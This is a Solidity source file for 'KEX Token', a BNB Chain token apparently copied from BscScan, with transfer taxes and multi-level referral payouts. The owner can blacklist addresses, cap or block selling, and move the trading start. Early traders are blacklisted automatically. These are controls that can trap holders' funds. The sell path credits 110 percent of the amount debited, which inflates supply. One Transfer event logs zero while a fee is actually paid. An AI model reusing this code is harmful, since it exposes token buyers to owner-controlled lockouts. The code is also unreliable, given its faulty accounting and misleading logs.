/**
 *Submitted for verification at BscScan.com on 2022-04-01
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;

    constructor () public{
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

contract KexToken is IERC20, Ownable {

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 public minRefNum = 1;
    mapping (address => bool) public exclude1;
    mapping (address => address) public uplines;
    address public pair;
    bool public pairIsCreated = true;
    uint256 public tradingEnabledTimestamp = 1623967200;
    address payable public marketAddress = 0x0260442CE6d961e4c52DACe58d90Ed6906B0282c;
    address public refAddress = 0x071b2A25D0c317D4295860304de117a7cE494F99;
    address public deadFeeAddress = 0x000000000000000000000000000000000000dEaD;
    address public poolTempAddress = 0x1000000000000000000000000000000000000001;
    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) public exclude2;
    mapping (address => bool) public isBlacklist;
    IPancakeRouter02 internal uniswapV2Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 private c_usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    uint256 public numTokensSellToAddToLiquidity = 10**18;
    uint256 public maxTokensSellAmount = 10000000*10**18;
    uint256 public maxTokensBuyAmount = 10000000*10**18;
    mapping (uint256 => uint256) public refRewardRate;
    
    constructor() public {
        refRewardRate[1] = 2;
        refRewardRate[2] = 1;
        refRewardRate[3] = 2;
        refRewardRate[4] = 1;
        refRewardRate[5] = 1;
        refRewardRate[6] = 1;
        refRewardRate[7] = 1;
        refRewardRate[8] = 1;		
        address _pair = pairFor(uniswapV2Router.factory(), address(this), uniswapV2Router.WETH());
        pair = _pair;
        exclude2[address(uniswapV2Router)] = true;
        exclude2[_pair] = true;
        uint256 total = 10000000*10**18;
        _balances[msg.sender] = total;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);
        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(this)] = true;
        exclude1[msg.sender] = true;
        exclude1[address(this)] = true;
        exclude1[address(uniswapV2Router)] = true;
        exclude1[_pair] = true;
    }

    function symbol() external pure returns (string memory) {
        return "KT";
    }

    function name() external pure returns (string memory) {
        return "KEX Token";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transfer1(address sender, address recipient, uint256 amount) private {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transfer2(address sender, address recipient, uint256 amount) private {
        _transfer1(sender, recipient, amount);
        if(!pairIsCreated){
            return;
        }
        uint256 poolTempAmount = _balances[poolTempAddress];
        if(poolTempAmount != 0) {
            _balances[pair] += poolTempAmount;
            emit Transfer(poolTempAddress, pair, poolTempAmount);
            _balances[poolTempAddress] = 0;
            IPancakePair(pair).sync();
        }
       
    }

    receive() external payable {}

   

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

   

    function _transfer3(address sender, address recipient, uint256 amount) private {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(senderBalance*9/10 >= amount, "ERC20: sell amount exceed 90% balance");
        require(maxTokensSellAmount >= amount, "ERC20: sell amount exceed max");
        _balances[sender] = senderBalance - amount;

        uint256 one = amount/100;
        _balances[address(this)] += 10*one;
        _refPayoutUSDT(sender, 10*one);

        uint256 receiveAmount = amount*85/100;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);
            
        _balances[deadFeeAddress] += 5*one;
        emit Transfer(sender, deadFeeAddress, 5*one);

        _balances[address(this)] += 10*one;
        emit Transfer(sender, address(this), 10*one);
    }

    function _transfer4(address sender, address recipient, uint256 amount) private {
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(maxTokensBuyAmount >= amount, "ERC20: sell amount exceed max");
        _balances[sender] = senderBalance - amount;

        uint256 receiveAmount = amount*90/100;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);

        uint256 one = amount/100;  
        _refPayoutToken(tx.origin, one);
            
        _balances[poolTempAddress] += 2*one;
        emit Transfer(tx.origin, poolTempAddress, 2*one);
            
        _balances[marketAddress] += 1*one;
        emit Transfer(tx.origin, marketAddress, 0*one);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        if(isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transfer1(sender, recipient, amount);
            if(uplines[recipient]==address(0) && !exclude1[recipient] && amount >= minRefNum) {
                uplines[recipient] = sender;
            }
            return;
        }
        require(!isBlacklist[sender], "sender in blacklist");
        if(!exclude2[sender] && !exclude2[recipient]) {
            _transfer2(sender, recipient, amount);
            if(uplines[recipient]==address(0) && !exclude1[recipient] && amount >= minRefNum) {
                uplines[recipient] = sender;
            }
            return;
        }
        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if(block.timestamp <= tradingEnabledTimestamp + 9) {
            if(!exclude2[sender]) {
                isBlacklist[sender] = true;
            }
            if(!exclude2[recipient]) {
                isBlacklist[recipient] = true;
            }
        }
        if(recipient == pair) {
            _transfer3(sender, recipient, amount);
            return;
        }
        if(sender == pair && recipient != address(uniswapV2Router)) {
            _transfer4(sender, recipient, amount);
            return;
        }
        _transfer1(sender, recipient, amount);
    }

    function _refPayoutToken(address addr, uint256 amount) private {
        address up = uplines[addr];
        uint256 totalPayout = 0;
        for(uint8 i = 1; i < 5; i++) {
            if(up == address(0)) break;
            uint256 reward = amount*refRewardRate[i];
            _balances[up] += reward;
            totalPayout += reward;
            emit Transfer(addr, up, reward);
            up = uplines[up];
        }
        totalPayout = 7*amount - totalPayout;
        if(totalPayout > 0) {
            _balances[refAddress] += totalPayout;
            emit Transfer(addr, refAddress, totalPayout);
        }
    }

    function _refPayoutUSDT(address addr, uint256 amount) private {
        swapTokensForTokens(amount, address(c_usdt));
        uint256 contractUSDTBalance = c_usdt.balanceOf(address(this));
        uint256 one = contractUSDTBalance/10;
        c_usdt.transfer(marketAddress, 2*one);
        address up = uplines[addr];
        uint256 totalPayout = 0;
        for(uint8 i = 1; i < 8; i++) {
            if(up == address(0)) break;
            uint256 reward = one*refRewardRate[i];
            totalPayout += reward;
            c_usdt.transfer(up, reward);
            up = uplines[up];
        }
        totalPayout = 8*one - totalPayout;
        if(totalPayout > 0) {
            c_usdt.transfer(refAddress, totalPayout);
        }
    }

    function swapTokensForTokens(uint256 tokenAmount, address tokenDesireAddress) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = tokenDesireAddress;
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }
    function setPairIsCreated(bool b) external onlyOwner {
        pairIsCreated = b;
    }
    function setTrade(uint256 t) external onlyOwner {
        tradingEnabledTimestamp = t;
    }
    function setSell(uint256 t) external onlyOwner {
        maxTokensSellAmount = t;
    }
    function setBuy(uint256 t) external onlyOwner {
        maxTokensBuyAmount = t;
    }
    function setL(uint256 t) external onlyOwner {
        numTokensSellToAddToLiquidity = t;
    }
    function setExcludeFee(address a, bool b) external onlyOwner {
        isExcludedFromFees[a] = b;
    }
    function setBlacklist(address a, bool b) external onlyOwner {
        isBlacklist[a] = b;
    }
    function setRP(address a, bool b) external onlyOwner {
        exclude2[a] = b;
    }
    function setMinRefNum(uint256 newMinRefNum) external onlyOwner {
        minRefNum = newMinRefNum;
    }
    function withdrawETH() external onlyOwner {
        marketAddress.transfer(address(this).balance);
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair{
    function token0() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
}